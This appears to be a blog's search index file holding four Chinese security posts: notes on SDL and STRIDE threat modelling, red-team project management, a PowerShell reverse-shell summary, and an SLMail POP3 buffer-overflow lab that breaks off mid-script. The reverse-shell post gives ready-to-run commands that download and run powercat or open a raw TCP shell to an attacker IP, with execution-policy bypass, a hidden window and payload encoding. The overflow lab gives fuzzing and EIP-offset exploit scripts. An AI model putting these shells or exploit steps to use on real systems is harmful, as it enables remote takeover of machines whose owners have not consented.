<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>SDLC学习笔记</title>
    <url>/2020/09/16/SDLC%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p><em>近期对SDL感兴趣，本篇内容大部分基于相关资料，权当学习笔记。</em></p>
<h3 id="SDL是什么？"><a href="#SDL是什么？" class="headerlink" title="SDL是什么？"></a><strong><em>SDL是什么？</em></strong></h3><p>   <em>安全开发生命周期（SDL）即Security Development Lifecycle，是一个帮助开发人员构建更安全的软件和解决安全合规要求的同时降低开发成本的软件开发过程。 SDL的核心理念就是将安全考虑集成在软件开发的每一个阶段:需求分析、设计、编码、测试和维护。从需求、设计到发布产品的每一个阶段每都增加了相应的安全活动，以减少软件中漏洞的数量并将安全缺陷降低到最小程度。（总的来说，安全开发生命周期 (SDL)是侧重于软件开发的安全保证过程，旨在开发出安全的软件应用。）</em></p>
<h3 id="SDL的安全活动"><a href="#SDL的安全活动" class="headerlink" title="SDL的安全活动"></a><strong><em>SDL的安全活动</em></strong></h3><p><em>SDL是从安全角度指导软件开发过程的管理模式，在传统软件开发生命周期 (SDLC) 的各个阶段增加了一些必要的安全活动，软件开发的不同阶段所执行的安全活动也不同，每个活动就算单独执行也都能对软件安全起到一定作用。 以下列出个人收集到的SDL活动简图：</em></p>
<img src="/2020/09/16/SDLC%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1.png" class>

<p><em>图1:源于微软SDL安全活动简图</em></p>
<img src="/2020/09/16/SDLC%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2.png" class>

<p><em>图2：源于某位的《SDL-最初实践》</em></p>
<img src="/2020/09/16/SDLC%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/3.png" class>

<p><em>图3：源于某SDL培训资料</em></p>
<h3 id="SDL设计核心原则"><a href="#SDL设计核心原则" class="headerlink" title="SDL设计核心原则"></a><strong><em>SDL设计核心原则</em></strong></h3><p><em>SDL安全设计核心原则:</em></p>
<ul>
<li><em>Attack Surface Reduction：攻击面最小化</em></li>
<li><em>Basic Privacy: 基本隐私</em></li>
<li><em>Least Privilege: 权限最小化</em></li>
<li><em>Secure Defaults: 默认安全</em></li>
<li><em>Defense in Depth：纵深防御</em></li>
<li><em>Threat Modeling：威胁建模</em></li>
</ul>
<h4 id="攻击面最小化"><a href="#攻击面最小化" class="headerlink" title="攻击面最小化"></a><strong><em>攻击面最小化</em></strong></h4><p><em>攻击面是指程序任何能被用户或者其它程序所访问到的部分，这些暴露给用户的地方往往也是最可能被恶意攻击者攻击的地方。攻击面最小化即是指尽量减少暴露恶意用户可能发现并试图利用的攻击面数量。软件产品的受攻击面是一个混合体，不仅包括代码、接口、服务，也包括对所有用户提供服务的协议。尤其是那些未被验证或者远程的用户都可以访问到的协议，安全人员在攻击面最小化时首先要对攻击面进行分析，攻击面分析就是枚举所有访问入库、接口、协议一剂可执行代码的过程，从高层次来说，攻击面分析着重于:</em></p>
<ul>
<li><em>降低默认执行的代码量</em></li>
<li><em>限制可访问到代码的人员范围</em></li>
<li><em>限定可访问到代码的人员身份</em></li>
<li><em>降低代码执行所需权限</em></li>
</ul>
<img src="/2020/09/16/SDLC%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/5.png" class>

<p><em>表1 攻击面分析常用技巧</em></p>
<p><em>攻击面最小化在微软的应用实践示例:</em></p>
<img src="/2020/09/16/SDLC%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/6.png" class>

<p><em>表2 攻击面最小化微软实践示例</em></p>
<h4 id="基本隐私"><a href="#基本隐私" class="headerlink" title="基本隐私"></a><strong><em>基本隐私</em></strong></h4><p><em>用户使用软件时无可避免个人信息被收集、使用甚至分发，企业则有责任和义务建立保护个人信息的保护措施，抵御敌对攻击行为，确保用户基本隐私的安全性。隐私安全是建立可信任应用程序的关键因素。在软件设计时考虑用户基本隐私的必要性及意义有:</em></p>
<ul>
<li><em>履行法律规定和义务</em></li>
<li><em>增加客户的信赖</em></li>
<li><em>防止堵塞部署</em></li>
</ul>
<p><em>对于特殊的软件或者全球性的产品，设计人员需要明确软件的行为及针对人群。尤其要考虑当地国家的法律法规，如美国儿童网路隐私保护法COPPA(Children’s Online Privacy Protection Act)等，企业在开发产品、服务时有必要制定明确的隐私准则，对获取、记录用户隐私的相关产品需有明确的要求和指导建议。Tips:</em></p>
<ul>
<li><em>只收集程序必须用到的隐私数据，并明确告知用户并征得用户同意;</em></li>
<li><em>微软对于用户隐私数据如密码、口令等均需要加密存储，最低要求是sha256+salt，对于更高要求的则使用PBKDF2算法加密存储;</em></li>
</ul>
<h4 id="权限最小化"><a href="#权限最小化" class="headerlink" title="权限最小化"></a><strong><em>权限最小化</em></strong></h4><p><em>如果一个应用程序或网站被攻击、破坏，权限最小化机制能够有效的将潜在损害最小化。常见的权限最小化实践如:</em></p>
<ul>
<li><em>普通管理员/系统管理员等角色管理</em></li>
<li><em>文件只读权限/文件访问权限等访问控制</em></li>
<li><em>进程/服务以所需最小用户权限运行</em></li>
</ul>
<p><em>在进行软件设计时，安全设计人员可以评估应用程序的行为及功能所需的最低限度权限及访问级别，从而合理分配相应的权限。如果程序特定情况必须要较高级别的权限，也可以考虑特权赋予及释放的机制。即便程序遭到攻击，也可以将损失降到最低。</em>Tips:*</p>
<ul>
<li><em>Windows系统中网络进程、本地服务、用户进程的权限都较低且互相独立，分别为NETWORK SERVICE、LOCAL SERVICE、user权限，只有核心的重要进程实用SYSTEM权限;</em></li>
<li><em>最新版本的Office程序打开不可信来源的文档时，默认时不可编辑的，同时也是默认不可执行代码的，即使存在缓冲区溢出漏洞，也不会执行shellcode等恶意代码;</em></li>
</ul>
<h4 id="默认安全"><a href="#默认安全" class="headerlink" title="默认安全"></a><strong><em>默认安全</em></strong></h4><p><em>默认安全配置在客户熟悉安全配置选项之前不仅有利于更好的帮助客户掌握安全配置经验，同时也可以确保应用程序初始状态下处于较安全状态。而客户可根据实际使用情况而决定应用程序安全与隐私的等级水平是否降低。Tips:</em></p>
<ul>
<li><em>在Win 7之后的Windows操作系统中，DEP(数据执行保护)默认是开启的。用户可设置选项改变DEP的状态;</em></li>
<li><em>Win 10默认启用安全防护软件Windows Defender，用户可选择关闭;</em></li>
</ul>
<h4 id="纵深防御"><a href="#纵深防御" class="headerlink" title="纵深防御"></a><strong><em>纵深防御</em></strong></h4><p><em>与默认安全一样，纵深防御也是设计安全方案时的重要指导思想。纵深防御包含两层含义：首先，要在各个不同层面、不同方面实施安全方案，避免出现疏漏，不同安全方案之间需要相互配合，构成一个整体；其次，要在正确的地方做正确的事情，即：在解决根本问题的地方实施针对性的安全方案。</em>纵深防御并不是同一个安全方案要做两遍或多遍，而是要从不同的层面、不同的角度对系统做出整体的解决方案。<em>Tips:</em></p>
<ul>
<li><em>针对XSS的防护，除了要对用户输入的特殊符号进行过滤，还要区分是否是富文本进而进行相应编码操作，在输入时过滤的同时在输出时也进行过滤操作。</em></li>
<li><em>即使做了十足的过滤、编码等安全防护，为了更一步确保缓解XSS攻击，Web站点也可以对Cookie启用HTTP-Only属性，确保即使发生XSS攻击，也可以阻止通过脚本访问Cookie的操作。</em></li>
</ul>
<h4 id="威胁建模"><a href="#威胁建模" class="headerlink" title="威胁建模"></a><strong><em>威胁建模</em></strong></h4><p><em>威胁建模是一种分析应用程序威胁的过程和方法。这里的威胁是指恶意用户可能会试图利用以破坏系统，和我们常说的漏洞并不相同。漏洞是一个特定的可以被利用的威胁，如缓冲区溢出、sql注入等。</em></p>
<p><em>作为SDL设计阶段的一部分安全活动，威胁建模允许安全设计人员尽在的识别潜在的安全问题并实施相应缓解措施。在设计阶段把潜在的威胁发现有助于威胁的全面和更有效的解决，同时也有助于降低开发和后期维护的成本。威胁建模的一般流程如下:</em></p>
<ul>
<li><em>与系统架构师及设计人员沟通，了解设计详情</em></li>
<li><em>使用成熟的威胁建模方法分析当前设计潜在的安全问题</em></li>
<li><em>提出安全建议及对潜在威胁的缓解措施</em></li>
<li><em>对安全设计进行验证并对整个设计方案进行回顾并再次确认</em></li>
</ul>
<p><em>微软使用的威胁建模方法是STRIDE威胁建模方法。为了便于安全人员快速便捷的进行威胁建模，微软开发基于STRIDE威胁建模方法的SDL Threat Modeling Tool威胁建模工具，该工具可以帮助安全人员画数据流图、分析威胁、生成并导出威胁建模报告。</em></p>
<h5 id="STRIDE建模"><a href="#STRIDE建模" class="headerlink" title="STRIDE建模"></a><strong><em>STRIDE建模</em></strong></h5><p><em>STRIDE威胁建模是由微软提出的一种威胁建模方法，该方法将威胁类型分为Spoofing（仿冒）、Tampering（篡改）、Repudiation（抵赖）、Information Disclosure（信息泄漏）、Denial of Service（拒绝服务）和 Elevation of Privilege（权限提升）。这六种威胁的首字母缩写即是STRIDE，STRIDE威胁模型几乎可以涵盖目前绝大部分安全问题。此外，STRIDE威胁建模方法有着详细的流程和方法。</em></p>
<p><em>STRIDE威胁建模的一般流程如下:</em></p>
<ul>
<li><em>绘制数据流图</em></li>
<li><em>识别威胁</em></li>
<li><em>提出缓解措施</em></li>
<li><em>安全验证</em></li>
</ul>
<img src="/2020/09/16/SDLC%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/7.png" class>

<h5 id="数据流图"><a href="#数据流图" class="headerlink" title="数据流图"></a><strong><em>数据流图</em></strong></h5><p><em>数据流图(Data Flow Diagrams)包含外部实体(External Entity)、处理过程(Process)、数据流(Data Flow)、数据存储(Data Store)，安全人员与系统架构师及设计人员沟通，了解设计详情并画出数据流图后还需要标注信任边界（Trust Boundary），针对简单的Web应用的数据流图如下:</em></p>
<img src="/2020/09/16/SDLC%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/8.png" class>

<h5 id="识别威胁"><a href="#识别威胁" class="headerlink" title="识别威胁"></a><strong><em>识别威胁</em></strong></h5><p><em>STRIDE威胁建模方法已经明确了每个数据流图元素具有不同的威胁，其中外部实体只有仿冒（S）、抵赖（R）威胁，数据流只有篡改（T）、信息泄露（I）、拒绝服务（D）威胁，处理过程有所有六种（STRIDE）威胁，存储过程有篡改（T）、信息泄露（I）、拒绝服务（D）威胁，但如果是日志类型存储则还有抵赖（R）威胁。具体可以对照如下表格进行威胁识别:</em></p>
<img src="/2020/09/16/SDLC%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/9.png" class>

<h5 id="缓解措施"><a href="#缓解措施" class="headerlink" title="缓解措施"></a><strong><em>缓解措施</em></strong></h5><p><em>根据不同的数据流图元素及威胁，相应的缓解措施也不相同。如本文示例数据流图中外部实体用户的仿冒威胁，其缓解措施简单来说就是对用户身份进行认证。对于一个Web应用来说，缓解仿冒威胁不仅需要较强的认证机制，还需要防止恶意攻击者用暴力破解、口令猜测等方法绕过认证从而造成仿冒用户的威胁。如果笔者来提出该用户仿冒威胁的缓解措施的话，详细措施如下:</em></p>
<ul>
<li><em>对用户访问进行帐号密码、证书等身份认证;</em></li>
<li><em>用户帐号密码认证过程中，如果出现三次密码错误，则增加验证码机制。输入验证码且正确再进行身份认证;</em></li>
<li><em>当用户认证5次后仍然验证失败，则在30分钟内禁止该帐号登录;</em></li>
<li><em>用户密码必须包含数字、字母及特殊字符，且长度在8位以上，如果业务安全需要则增加密码过期机制，每隔6个月提醒用户修改密码;</em></li>
</ul>
<p><em>在提出缓解措施时，有的时候不仅要考虑安全问题，同时也要考虑软件的易用性，所以不同的威胁，不同的应用场景。其缓解措施也要随之而改变以提高应用安全的同时也能给用户带来较好的交互体验。</em></p>
<p><em>微软对于常用的威胁给出了其常用的标准缓解措施，并在具体实施时已将常用的缓解方案及措施集成为独立的解决方案或者代码模块。可以方便同类应用直接使用。</em>f</p>
<img src="/2020/09/16/SDLC%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/10.png" class>

<h5 id="安全验证"><a href="#安全验证" class="headerlink" title="安全验证"></a><strong><em>安全验证</em></strong></h5><p><em>在威胁建模完成后，需要对整个过程进行回顾，不仅要确认缓解措施是否能够真正缓解潜在威胁，同时验证数据流图是否符合设计，代码实现是否符合预期设计，所有的威胁是否都有相应的缓解措施。最后将威胁建模报告留存档案，作为后续迭代开发、增量开发时威胁建模的参考依据。</em></p>
<h3 id="SDL交付初探"><a href="#SDL交付初探" class="headerlink" title="SDL交付初探"></a><strong><em>SDL交付初探</em></strong></h3><p><em>通过查阅相关SDL案例的交付资料，发现针对SDL的活动的交付有不同侧重：有的交付会把重心放在技术实践，交付就搞点培训、checklist、做些安测；有的交付则会以针对性的流程规范建立为主。个人觉得可能是甲方乙方的角度不同导致侧重点不同，又或者是国内目前SDL这块还不太规范。个人理解SDL活动及交付简图如下：</em></p>
<img src="/2020/09/16/SDLC%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/4.png" class>

<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a><strong><em>参考文章</em></strong></h3><p>1、【软件安全设计】安全开发生命周期SDL：<a href="http://blog.nsfocus.net/sdl">http://blog.nsfocus.net/sdl</a></p>
<p>2、《SDL最初实践-aerfa》：<a href="https://cloud.tencent.com/developer/article/1380772">https://cloud.tencent.com/developer/article/1380772</a></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
  </entry>
  <entry>
    <title>powershell反连小结</title>
    <url>/2020/06/21/powershell%E5%8F%8D%E8%BF%9E%E5%B0%8F%E7%BB%93/</url>
    <content><![CDATA[<h3 id="一、-直接外联powercat："><a href="#一、-直接外联powercat：" class="headerlink" title="一、 直接外联powercat："></a><strong>一、 直接外联powercat：</strong></h3><p><strong>cmd下运行</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">powershell IEX (New-Object System.Net.Webclient).DownloadString(<span class="string">&#x27;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#x27;</span>); powercat -c 192.168.181.137 -p 4444 -e cmd</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>可以加上以下两个参数，加强适用性：</strong></p>
<p> -EX bypass   （绕过限制权限执行）</p>
<p> -W hidden    （关闭窗口）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">powershell -EX bypass -W hidden IEX (New-Object System.Net.Webclient).DownloadString(<span class="string">&#x27;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#x27;</span>); powercat -c 192.168.181.137 -p 4444 -e cmd</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>(实测该地址可能会被墙掉：<a href="https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1">https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1</a>)</p>
<h3 id="二、-直接本地新建连接："><a href="#二、-直接本地新建连接：" class="headerlink" title="二、 直接本地新建连接："></a><strong>二、 直接本地新建连接：</strong></h3><p><strong>powershell 下直接粘贴执行</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$client</span> = New-Object System.Net.Sockets.TCPClient(<span class="string">&#x27;192.168.181.137&#x27;</span>,4444);</span><br><span class="line"><span class="variable">$stream</span> = <span class="variable">$client</span>.GetStream();</span><br><span class="line">[byte[]]<span class="variable">$bytes</span> = 0..65535|%&#123;0&#125;;</span><br><span class="line"><span class="keyword">while</span>((<span class="variable">$i</span> = <span class="variable">$stream</span>.Read(<span class="variable">$bytes</span>, 0, <span class="variable">$bytes</span>.Length)) -ne 0)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$data</span> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(<span class="variable">$bytes</span>,0, <span class="variable">$i</span>);</span><br><span class="line"><span class="variable">$sendback</span> = (iex <span class="variable">$data</span> 2&gt;&amp;1 | Out-String );</span><br><span class="line"><span class="variable">$sendback2</span> = <span class="variable">$sendback</span> + <span class="string">&#x27;PS &#x27;</span> + (<span class="built_in">pwd</span>).Path + <span class="string">&#x27;&gt; &#x27;</span>;</span><br><span class="line"><span class="variable">$sendbyte</span> = ([text.encoding]::ASCII).GetBytes(<span class="variable">$sendback2</span>);</span><br><span class="line"><span class="variable">$stream</span>.Write(<span class="variable">$sendbyte</span>,0,<span class="variable">$sendbyte</span>.Length);</span><br><span class="line"><span class="variable">$stream</span>.Flush();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$client</span>.Close();</span><br></pre></td></tr></table></figure>



<h3 id="三、-powershell-编码执行"><a href="#三、-powershell-编码执行" class="headerlink" title="三、 powershell 编码执行"></a><strong>三、 powershell 编码执行</strong></h3><p><strong>1、本地使用powercat 编码</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">powershell                       <span class="comment">#进入powershell命令行</span></span><br><span class="line">Set-ExecutionPolicy RemoteSigned <span class="comment">#设置允许执行本地powershell脚本</span></span><br><span class="line">Import-Module ./powercat.ps1     <span class="comment">#导入powercat脚本</span></span><br><span class="line">powercat -h                      <span class="comment"># 查看使用帮助</span></span><br><span class="line">powercat -c 192.168.181.137 -p 6666 -e cmd.exe -ge &gt; encodedreverseshell.ps1    <span class="comment">#生成编码后的payload</span></span><br></pre></td></tr></table></figure>

<p><strong>2、远程使用powercat编码</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">powershell -EX bypass  IEX (New-Object System.Net.Webclient).DownloadString(<span class="string">&#x27;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#x27;</span>); powercat -c 192.168.181.137 -p 6666 -e cmd.exe -ge &gt; encodedreverseshell.ps1</span><br></pre></td></tr></table></figure>

<p><strong>使用以上命令会生成编码后的反连payload样式如下图</strong></p>
<img src="/2020/06/21/powershell%E5%8F%8D%E8%BF%9E%E5%B0%8F%E7%BB%93/20.png" class>

<p><strong>3、使用powershell -E 执行编码 （要在powershell内执行，在CMD中尝试失败。。。）</strong></p>
<img src="/2020/06/21/powershell%E5%8F%8D%E8%BF%9E%E5%B0%8F%E7%BB%93/21.png" class>



<img src="/2020/06/21/powershell%E5%8F%8D%E8%BF%9E%E5%B0%8F%E7%BB%93/22.png" class>

<p><strong>常规base64解码解出内容如下：（看不出连接IP🙃）</strong></p>
<img src="/2020/06/21/powershell%E5%8F%8D%E8%BF%9E%E5%B0%8F%E7%BB%93/23.png" class>]]></content>
      <categories>
        <category>安全技巧</category>
      </categories>
  </entry>
  <entry>
    <title>红队项目经理的一般套路</title>
    <url>/2020/09/11/%E7%BA%A2%E9%98%9F%E9%A1%B9%E7%9B%AE%E7%BB%8F%E7%90%86%E7%9A%84%E4%B8%80%E8%88%AC%E5%A5%97%E8%B7%AF/</url>
    <content><![CDATA[<h3 id="0x00-红队服务的基本了解"><a href="#0x00-红队服务的基本了解" class="headerlink" title="0x00 红队服务的基本了解"></a><strong><em>0x00 红队服务的基本了解</em></strong></h3><h4 id="一、红队服务定义："><a href="#一、红队服务定义：" class="headerlink" title="一、红队服务定义："></a><strong><em>一、红队服务定义：</em></strong></h4><p>   <strong>采用最大限度模拟APT攻击手法，不限定攻击路径和手段，以不采用破坏性攻击为底 线，以系统提权、控制业务、获取数据为目标，深入评估企业安全防护短板</strong></p>
<h4 id="二、红队服务与渗透测试的区别："><a href="#二、红队服务与渗透测试的区别：" class="headerlink" title="二、红队服务与渗透测试的区别："></a><strong><em>二、红队服务与渗透测试的区别：</em></strong></h4><p><strong><img src="/2020/09/11/%E7%BA%A2%E9%98%9F%E9%A1%B9%E7%9B%AE%E7%BB%8F%E7%90%86%E7%9A%84%E4%B8%80%E8%88%AC%E5%A5%97%E8%B7%AF/1.png" class></strong></p>
<h3 id="0x01-红队项目经理的职责定义与存在意义"><a href="#0x01-红队项目经理的职责定义与存在意义" class="headerlink" title="0x01 红队项目经理的职责定义与存在意义"></a><strong><em>0x01 红队项目经理的职责定义与存在意义</em></strong></h3><h4 id="一、职责定义："><a href="#一、职责定义：" class="headerlink" title="一、职责定义："></a><strong><em>一、职责定义：</em></strong></h4><p><strong>红队项目经理是负责红队项目规划、需求对接、实施跟进、风险控制、报告优化、项目收尾的服务于整个 红队项目生命周期的专业人员,是项目的管理者和负责人。（与红队队长不同，红队队长是负责红队工程师的管理，以及红队工作的具体实施，是具体红队工作的执行者)</strong></p>
<h4 id="二、存在意义："><a href="#二、存在意义：" class="headerlink" title="二、存在意义："></a><strong><em>二、存在意义：</em></strong></h4><p><strong>1、全方面对接三方人员（客户、销售、红队）</strong></p>
<p><strong>2、更深层次把握客户需求，提升红队交付质量和业务对接水平，最大化红队报告成果</strong></p>
<p><strong>3、更全面的把握红队实施全局，形成标准化战法</strong></p>
<h3 id="0x02-一般实施思路"><a href="#0x02-一般实施思路" class="headerlink" title="0x02 一般实施思路"></a><strong><em>0x02 一般实施思路</em></strong></h3><p> <strong><img src="/2020/09/11/%E7%BA%A2%E9%98%9F%E9%A1%B9%E7%9B%AE%E7%BB%8F%E7%90%86%E7%9A%84%E4%B8%80%E8%88%AC%E5%A5%97%E8%B7%AF/2.png" class></strong></p>
]]></content>
      <categories>
        <category>技战法</category>
      </categories>
  </entry>
  <entry>
    <title>缓冲区溢出实验（Smail）</title>
    <url>/2020/05/20/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%AE%9E%E9%AA%8C%EF%BC%88Smail%EF%BC%89/</url>
    <content><![CDATA[<h2 id="0x00实验环境："><a href="#0x00实验环境：" class="headerlink" title="0x00实验环境："></a><strong><em>0x00实验环境：</em></strong></h2><p><strong><em>攻机：Kali</em></strong></p>
<p><strong><em>靶机：windows xp</em></strong></p>
<p><strong><em>软件：SLMail 5.5.0、immunity debugger 、mona.py</em></strong></p>
<h2 id="0x01实验思路："><a href="#0x01实验思路：" class="headerlink" title="0x01实验思路："></a><strong><em>0x01实验思路：</em></strong></h2><p><strong>Step 1. 利用python脚本测试连接windows的POP3</strong></p>
<p><strong><em>Step 2. 测试符合是否会发生缓冲区溢出</em></strong></p>
<p><strong><em>Step 3. 确定EIP的位置</em></strong></p>
<p><strong><em>Step 4 .验证EIP位置与ESP存放数据长度</em></strong></p>
<p><strong><em>Step 5. 查找jmp esp</em></strong></p>
<p><strong><em>Step 6. 测试跳转</em></strong></p>
<p><strong><em>Step 7. 判断坏字符</em></strong></p>
<p><strong><em>Step 8. 构造shellcode</em></strong></p>
<h2 id="0x02实验记录："><a href="#0x02实验记录：" class="headerlink" title="0x02实验记录："></a><strong><em>0x02实验记录：</em></strong></h2><h3 id="Step1-利用python脚本测试连接windows的POP3"><a href="#Step1-利用python脚本测试连接windows的POP3" class="headerlink" title="Step1.利用python脚本测试连接windows的POP3"></a><strong><em>Step1.利用python脚本测试连接windows的POP3</em></strong></h3><p><strong><em>思路：</em></strong></p>
<p><strong>使用Python模拟正常连接</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	<span class="built_in">print</span> <span class="string">&quot;\n Sending buffer....&quot;</span></span><br><span class="line">	s.connect((<span class="string">&#x27;192.168.181.129&#x27;</span>,<span class="number">110</span>))</span><br><span class="line">	date = s.recv(<span class="number">1024</span>)</span><br><span class="line">	<span class="built_in">print</span> date</span><br><span class="line"></span><br><span class="line">	s.send(<span class="string">&#x27;USER LWW&#x27;</span>+<span class="string">&#x27;\n\r&#x27;</span>)</span><br><span class="line">	date = s.recv(<span class="number">1024</span>)</span><br><span class="line">	<span class="built_in">print</span> date</span><br><span class="line"></span><br><span class="line">	s.send(<span class="string">&#x27;PASS LWW&#x27;</span>+<span class="string">&#x27;\n\r&#x27;</span>)</span><br><span class="line">	date = s.recv(<span class="number">1024</span>)</span><br><span class="line">	<span class="built_in">print</span> date</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span>  Exception,e:</span><br><span class="line">	<span class="built_in">print</span> e	</span><br></pre></td></tr></table></figure>

<h3 id="Step-2-确定是否会溢出及初步EIP定位"><a href="#Step-2-确定是否会溢出及初步EIP定位" class="headerlink" title="Step 2. 确定是否会溢出及初步EIP定位"></a><strong><em>Step 2. 确定是否会溢出及初步EIP定位</em></strong></h3><p><strong><em>思路：</em></strong></p>
<p><strong>通过发送递增的字符串，来判断是否会溢出；并通过及时输出字节长度，初步EIP定位</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s= socket.socket(socket.AF_INET , socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">buffer = [<span class="string">&quot;A&quot;</span>]</span><br><span class="line"></span><br><span class="line">count = <span class="number">100</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(buffer) &lt;=<span class="number">30</span>:</span><br><span class="line">	buffer.append(<span class="string">&quot;A&quot;</span>*count)</span><br><span class="line">	count +=<span class="number">200</span></span><br><span class="line">	</span><br><span class="line"><span class="keyword">try</span>:	</span><br><span class="line">	<span class="keyword">for</span> strings <span class="keyword">in</span> buffer:</span><br><span class="line">		<span class="built_in">print</span> <span class="string">&quot;Fuzzing PASS with %s bytes&quot;</span> %<span class="built_in">len</span>(strings)</span><br><span class="line">		s= socket.socket(socket.AF_INET , socket.SOCK_STREAM)</span><br><span class="line">		s.connect((<span class="string">&#x27;192.168.181.129&#x27;</span> , <span class="number">110</span>))</span><br><span class="line">		s.recv(<span class="number">1024</span>)</span><br><span class="line">		s.send(<span class="string">&#x27;USER LWW&#x27;</span>+<span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">		s.recv(<span class="number">1024</span>)</span><br><span class="line">		s.send(<span class="string">&#x27;PASS&#x27;</span>+strings+<span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">		s.send(<span class="string">&#x27;QUIT&#x27;</span>+<span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">		s.close()</span><br><span class="line">		</span><br><span class="line"><span class="keyword">except</span>  Exception,e:</span><br><span class="line">	<span class="built_in">print</span> e	</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Step-3-确定EIP的位置"><a href="#Step-3-确定EIP的位置" class="headerlink" title="Step 3. 确定EIP的位置"></a><strong><em>Step 3. 确定EIP的位置</em></strong></h3><p><strong><em>思路：</em></strong></p>
<p><strong>通过发送* *</strong>唯一字符串*** *的方法，来具体定位EIP位置**</p>
<p><strong>辅助工具：</strong></p>
<p><strong>（1）pattern_create.rb（kali里的生成唯一字符串脚本）</strong></p>
<p><strong>（2） pattern_offset.rb（kali里的计算唯一字符串具体溢出点脚本）</strong></p>
<p><strong>实操记录：</strong></p>
<p><strong>1、使用mmunity Debugger “attach” SLmail 服务</strong></p>
<img src="/2020/05/20/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%AE%9E%E9%AA%8C%EF%BC%88Smail%EF%BC%89/1.png" class>

<p><strong>2、生成及发送 唯一字符串(本实验生成3000个唯一字符)</strong></p>
<img src="/2020/05/20/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%AE%9E%E9%AA%8C%EF%BC%88Smail%EF%BC%89/2.png" class>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s= socket.socket(socket.AF_INET , socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">buffer = <span class="string">&quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0B